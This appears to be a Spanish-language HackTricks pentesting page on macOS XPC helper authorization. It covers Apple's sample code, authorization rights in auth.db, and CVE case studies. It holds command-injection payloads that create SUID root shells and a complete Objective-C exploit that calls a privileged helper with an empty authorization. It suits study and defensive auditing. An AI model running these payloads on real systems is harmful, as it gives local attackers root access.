# Autorización de XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorización de XPC

Apple también propone otra forma de autenticar si el proceso que se conecta tiene **permisos para llamar a un método XPC expuesto**.<sup>[[2]](#references)</sup>

Cuando una aplicación necesita **ejecutar acciones como un usuario privilegiado**, en lugar de ejecutar la app como un usuario privilegiado, normalmente instala como root un HelperTool como un servicio XPC que puede ser llamado desde la app para realizar esas acciones. Sin embargo, la app que llama al servicio debe tener autorización suficiente.

### ShouldAcceptNewConnection siempre YES

Se puede encontrar un ejemplo en [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). En `App/AppDelegate.m` intenta **conectarse** al **HelperTool**. Y en `HelperTool/HelperTool.m`, la función **`shouldAcceptNewConnection`** **no comprobará** ninguno de los requisitos indicados anteriormente. Siempre devolverá YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para obtener más información sobre cómo configurar correctamente esta comprobación:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Derechos de la aplicación

Sin embargo, hay cierta **autorización en curso cuando se llama a un método de HelperTool**.

La función **`applicationDidFinishLaunching`** de `App/AppDelegate.m` creará una referencia de autorización vacía después de que la aplicación se haya iniciado. Esto siempre debería funcionar.\
A continuación, intentará **añadir algunos derechos** a esa referencia de autorización llamando a `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La función `setupAuthorizationRights` de `Common/Common.m` almacenará en la base de datos de autorización `/var/db/auth.db` los derechos de la aplicación. Observa que solo añadirá los derechos que aún no estén en la base de datos:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La función `enumerateRightsUsingBlock` es la que se utiliza para obtener los permisos de las aplicaciones, que se definen en `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Esto significa que, al final de este proceso, los permisos declarados dentro de `commandInfo` se almacenarán en `/var/db/auth.db`. Observa que allí puedes encontrar, para **cada método** que **requiera autenticación**, el **nombre del permiso** y **`kCommandKeyAuthRightDefault`**. Este último **indica quién puede obtener este derecho**.<sup>[[1]](#references)</sup>

Existen diferentes ámbitos para indicar quién puede acceder a un derecho. Algunos están definidos en [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (puedes encontrar [todos aquí](https://www.dssw.co.uk/reference/authorization-rights/)), pero, en resumen:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Nombre</th><th width="165">Valor</th><th>Descripción</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Cualquiera</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nadie</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>El usuario actual debe ser administrador (pertenecer al grupo de administradores)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Solicitar al usuario que se autentique.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Solicitar al usuario que se autentique. Debe ser administrador (pertenecer al grupo de administradores)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especificar reglas</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especificar comentarios adicionales sobre el derecho</td></tr></tbody></table>

### Verificación de derechos

En `HelperTool/HelperTool.m`, la función **`readLicenseKeyAuthorization`** comprueba si el caller está autorizado para **ejecutar dicho método**, llamando a la función **`checkAuthorization`**. Esta función comprobará que los **`authData`** enviados por el proceso caller tengan un **formato correcto** y, después, comprobará **qué se necesita para obtener el derecho** de llamar al método específico. Si todo va bien, el **`error` devuelto será `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Ten en cuenta que, para **comprobar los requisitos necesarios para obtener el derecho** a llamar a ese método, la función `authorizationRightForCommand` simplemente comprobará el objeto comentado anteriormente **`commandInfo`**. A continuación, llamará a **`AuthorizationCopyRights`** para comprobar **si tiene los derechos** necesarios para llamar a la función (ten en cuenta que los flags permiten interactuar con el usuario).<sup>[[1]](#references)[[3]](#references)</sup>

En este caso, para llamar a la función `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` está definido como `@kAuthorizationRuleClassAllow`. Por lo tanto, **cualquiera puede llamarla**.

### Información de la DB

Se mencionó que esta información se almacena en `/var/db/auth.db`. Puedes enumerar todas las reglas almacenadas con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Luego, puedes leer quién puede acceder al derecho con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permisos permisivos

Puedes encontrar **todas las configuraciones de permisos** [**aquí**](https://www.dssw.co.uk/reference/authorization-rights/), pero las combinaciones que no requerirán interacción del usuario serían:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Esta es la clave más directa. Si se establece en `false`, especifica que un usuario no necesita proporcionar autenticación para obtener este permiso.
- Se utiliza **en combinación con una de las 2 opciones siguientes o indicando un grupo** al que el usuario debe pertenecer.
2. **'allow-root': 'true'**
- Si un usuario opera como el usuario root (que tiene permisos elevados) y esta clave se establece en `true`, el usuario root podría obtener potencialmente este permiso sin autenticación adicional. Sin embargo, normalmente, alcanzar el estado de usuario root ya requiere autenticación, por lo que para la mayoría de los usuarios esto no constituye un escenario de "sin autenticación".
3. **'session-owner': 'true'**
- Si se establece en `true`, el propietario de la sesión (el usuario que ha iniciado sesión actualmente) obtendría automáticamente este permiso. Esto podría omitir autenticación adicional si el usuario ya ha iniciado sesión.
4. **'shared': 'true'**
- Esta clave no concede permisos sin autenticación. En su lugar, si se establece en `true`, significa que, una vez autenticado el permiso, este puede compartirse entre varios procesos sin que cada uno de ellos necesite autenticarse de nuevo. Sin embargo, la concesión inicial del permiso seguiría requiriendo autenticación, a menos que se combine con otras claves como `'authenticate-user': 'false'`.

Puedes [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obtener los permisos interesantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Casos de estudio de bypass de autorización

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: El servicio Mach privilegiado `com.acustica.HelperTool` acepta todas las conexiones y su rutina `checkAuthorization:` llama a `AuthorizationCopyRights(NULL, …)`, por lo que cualquier blob de 32 bytes pasa. `executeCommand:authorization:withReply:` introduce después strings separados por comas y controlados por el atacante en `NSTask` como root, haciendo posibles payloads como:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
crear trivialmente un shell SUID root. Detalles en [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: El listener siempre devuelve YES y el mismo patrón NULL de `AuthorizationCopyRights` aparece en `checkAuthorization:`. El método `exchangeAppWithReply:` concatena input controlado por el atacante en un string de `system()` dos veces, por lo que inyectar shell metacharacters en `appPath` (por ejemplo, `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) permite ejecutar código como root a través del Mach service `com.plugin-alliance.pa-installationhelper`. Más información [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Ejecutar un audit crea `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expone el Mach service `com.jamf.complianceeditor.helper` y exporta `-executeScriptAt:arguments:then:` sin verificar el `AuthorizationExternalForm` ni la code signature del caller. Un exploit trivial ejecuta `AuthorizationCreate` con una referencia vacía, se conecta mediante `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca el método para ejecutar binaries arbitrarios como root. Las reversing notes completas (incluido el PoC) están en el [write-up de Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 y 7.4.0–7.4.2 aceptaban mensajes XPC manipulados que llegaban a un helper privilegiado sin authorization gates. Como el helper confiaba en su propio `AuthorizationRef` privilegiado, cualquier usuario local capaz de enviar mensajes al service podía obligarlo a ejecutar cambios de configuración o comandos arbitrarios como root. Detalles en el [resumen del advisory de SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Consejos para un rapid triage

- Cuando una app incluye tanto una GUI como un helper, compara sus code requirements y comprueba si `shouldAcceptNewConnection` bloquea el listener con `-setCodeSigningRequirement:` (o valida `SecCodeCopySigningInformation`). La ausencia de estas comprobaciones suele producir escenarios CWE-863 como el caso de Jamf. Una revisión rápida sería:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compara lo que el helper *cree* que está autorizando con lo que proporciona el cliente. Al hacer reversing, establece un breakpoint en `AuthorizationCopyRights` y confirma que `AuthorizationRef` se origina en `AuthorizationCreateFromExternalForm` (proporcionado por el cliente) en lugar del contexto privilegiado propio del helper; de lo contrario, probablemente hayas encontrado un patrón CWE-863 similar a los casos anteriores.

## Reversing de Authorization

### Comprobar si se utiliza EvenBetterAuthorization

Si encuentras la función: **`[HelperTool checkAuthorization:command:]`**, probablemente el proceso esté utilizando el esquema mencionado anteriormente para la autorización:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Esto, si esta función llama a funciones como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, está utilizando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Comprueba **`/var/db/auth.db`** para ver si es posible obtener permisos para llamar a alguna acción privilegiada sin interacción del usuario.

### Comunicación del protocolo

Después, debes encontrar el esquema del protocolo para poder establecer una comunicación con el servicio XPC.

La función **`shouldAcceptNewConnection`** indica el protocolo exportado:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

En este caso, tenemos lo mismo que en EvenBetterAuthorizationSample; [**comprueba esta línea**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Conociendo el nombre del protocolo utilizado, es posible **volcar la definición de su header** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por último, solo necesitamos conocer el **name of the exposed Mach Service** para poder establecer una comunicación con él. Hay varias formas de encontrarlo:

- En **`[HelperTool init]`**, donde puedes ver el Mach Service utilizado:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- En el plist de launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Ejemplo de Exploit

En este ejemplo se crean:

- La definición del protocolo con las funciones
- Un auth vacío que se utilizará para solicitar acceso
- Una conexión al servicio XPC
- Una llamada a la función si la conexión se realizó correctamente
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Otros helpers de privilegios de XPC abusados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## Referencias

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror en GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Escalada de privilegios en Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Vulnerabilidad de escalada de privilegios en FortiClient para Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Escalada de privilegios local en el servicio XPC HelperTool de Acustica Audio en Aquarius Desktop para macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Escalada de privilegios local en el servicio XPC InstallationHelper de Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Escalada de privilegios en el framework EndpointSecurity de Apple (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Referencia de derechos de Authorization (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)

{{#include ../../../../../banners/hacktricks-training.md}}
